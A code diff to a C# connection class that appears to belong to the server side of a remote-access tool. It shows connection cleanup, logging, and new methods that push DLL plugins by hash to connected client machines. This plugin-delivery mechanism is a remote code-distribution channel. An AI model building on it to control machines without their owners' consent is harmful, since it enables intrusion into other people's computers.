@@ -3,17 +3,15 @@ using System.IO;
 using System.Net.Sockets;
 using System.Windows.Forms;
 using Server.Handle_Packet;
-using System.Security.Cryptography;
 using System.Drawing;
 using System.Diagnostics;
 using System.Threading;
 using Server.MessagePack;
-using System.Text;
 using System.Net.Security;
 using System.Security.Authentication;
-using System.Threading.Tasks;
 using Server.Algorithm;
-using Server.Helper;
+using Microsoft.VisualBasic;
+using System.Collections.Generic;
 
 namespace Server.Connection
 {
@@ -30,7 +28,6 @@ namespace Server.Connection
         private MemoryStream ClientMS { get; set; }
         public object SendSync { get; } = new object();
         public long BytesRecevied { get; set; }
-
 
         public Clients(Socket socket)
         {
@@ -92,7 +89,7 @@ namespace Server.Connection
                             BytesRecevied += Recevied;
                             if (ClientMS.Length == ClientBuffersize)
                             {
-                                ThreadPool.QueueUserWorkItem(Packet.Read, new object[] { ClientMS.ToArray(), this });
+                                ThreadPool.QueueUserWorkItem(new Packet().Read, new object[] { ClientMS.ToArray(), this });
                                 ClientBuffer = new byte[4];
                                 ClientMS.Dispose();
                                 ClientMS = new MemoryStream();
@@ -119,36 +116,27 @@ namespace Server.Connection
         {
             if (LV != null)
             {
-                if (Program.form1.listView1.InvokeRequired)
-                    Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
+                Program.form1.BeginInvoke((MethodInvoker)(() =>
+                {
+                    try
                     {
-                        try
+
+                        lock (Settings.LockListviewClients)
+                            LV.Remove();
+
+                        if (LV2 != null)
                         {
-
-                            lock (Settings.LockListviewClients)
-                                LV.Remove();
-
-                            if (LV2 != null)
-                            {
-                                lock (Settings.LockListviewThumb)
-                                    LV2.Remove();
-                            }
-
+                            lock (Settings.LockListviewThumb)
+                                LV2.Remove();
                         }
-                        catch { }
-                    }));
+                    }
+                    catch { }
+                }));
+                new HandleLogs().Addmsg($"Client {TcpClient.RemoteEndPoint.ToString().Split(':')[0]} disconnected", Color.Red);
             }
 
             try
             {
-                TcpClient.Shutdown(SocketShutdown.Both);
-            }
-            catch { }
-
-            try
-            {
-                SslClient?.Close();
-                TcpClient?.Close();
                 SslClient?.Dispose();
                 TcpClient?.Dispose();
                 ClientMS?.Dispose();
@@ -197,6 +185,7 @@ namespace Server.Connection
                     {
                         SslClient.Write(buffer, 0, buffer.Length);
                         SslClient.Flush();
+                        Settings.Sent += buffer.Length;
                     }
                     Debug.WriteLine("/// Server Sent " + buffer.Length.ToString() + " Bytes  ///");
                 }
@@ -205,6 +194,71 @@ namespace Server.Connection
                     Disconnected();
                     return;
                 }
+            }
+        }
+
+        public void CheckPlugin() // send all plugins md5 hash to client
+        {
+            try
+            {
+                List<string> plugins = new List<string>();
+                foreach (var plugin in Settings.Plugins)
+                {
+                    plugins.Add(plugin.Key);
+                }
+                if (plugins.Count > 0)
+                {
+                    MsgPack msgPack = new MsgPack();
+                    msgPack.ForcePathObject("Packet").SetAsString("checkPlugin");
+                    msgPack.ForcePathObject("Hash").SetAsString(string.Join(",", plugins));
+                    Send(msgPack.Encode2Bytes());
+                }
+            }
+            catch (Exception ex)
+            {
+                new HandleLogs().Addmsg($"Client {TcpClient.RemoteEndPoint.ToString().Split(':')[0]} {ex.Message}", Color.Red);
+            }
+        }
+
+        public void SendPlugin(string hash) // client is missing some plguins, sending them
+        {
+            try
+            {
+                foreach (var plugin in Settings.Plugins)
+                {
+                    if (hash == plugin.Key)
+                    {
+                        MsgPack msgPack = new MsgPack();
+                        msgPack.ForcePathObject("Packet").SetAsString("savePlugin");
+                        msgPack.ForcePathObject("Dll").SetAsString(plugin.Value);
+                        msgPack.ForcePathObject("Hash").SetAsString(plugin.Key);
+                        Send(msgPack.Encode2Bytes());
+                        break;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                new HandleLogs().Addmsg($"Client {TcpClient.RemoteEndPoint.ToString().Split(':')[0]} {ex.Message}", Color.Red);
+            }
+        }
+
+        public void ReSendPAlllugins() // because we used ReSendPlugins ToolStripMenuItem
+        {
+            try
+            {
+                foreach (var plugin in Settings.Plugins)
+                {
+                    MsgPack msgPack = new MsgPack();
+                    msgPack.ForcePathObject("Packet").SetAsString("savePlugin");
+                    msgPack.ForcePathObject("Dll").SetAsString(plugin.Value);
+                    msgPack.ForcePathObject("Hash").SetAsString(plugin.Key);
+                    Send(msgPack.Encode2Bytes());
+                }
+            }
+            catch (Exception ex)
+            {
+                new HandleLogs().Addmsg($"Client {TcpClient.RemoteEndPoint.ToString().Split(':')[0]} {ex.Message}", Color.Red);
             }
         }
 
